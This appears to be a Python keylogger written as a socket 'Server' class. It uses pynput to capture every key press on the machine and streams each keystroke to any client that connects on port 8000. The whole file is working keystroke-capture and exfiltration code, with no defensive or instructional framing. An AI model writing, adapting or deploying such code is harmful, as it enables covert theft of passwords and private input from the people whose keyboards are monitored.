import socket
from pynput.keyboard import Key, Listener
import threading

class Server:
    def __init__(self, host, port):
        self.host = str(host)
        self.port = int(port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection = None

    def on_press(self, key):
        try:
            key_str = str(key)
            # Send the key press as a string, properly encoding it as bytes
            if self.connection:
                message = f"Key_pressed: {key_str}\n"
                self.connection.sendall(message.encode('utf-8'))
        except Exception as err:
            print(f"Error sending key press: {err}")

    def binding(self):
        """Bind the server to the host and port."""
        self.server.bind((self.host, self.port))

    def listen(self):
        """Start listening for incoming connections."""
        print(f"Listening on {self.host}:{self.port}...")
        self.server.listen(1)  # Limit to 1 connection at a time

    def accept_connection(self):
        """Accept incoming connections and handle communication."""
        self.connection, self.address = self.server.accept()
        print(f"Connection established with {self.address}")

        # Start listening for keyboard input in a separate thread
        listener_thread = threading.Thread(target=self.listen_for_keys)
        listener_thread.start()

        listener_thread.join()  # Wait for the listener to finish before closing the connection

        # Close the connection after sending the response
        self.connection.close()
        print("Connection closed.")

    def listen_for_keys(self):
        """Start listening for key presses."""
        with Listener(on_press=self.on_press) as listener:
            listener.join()  # This blocks until the listener is stopped

    def run(self):
        """Run the server to continuously accept connections."""
        while True:
            self.accept_connection()

# Instantiate and start the server
S = Server('127.0.0.1', 8000)
S.binding()
S.listen()
S.run()
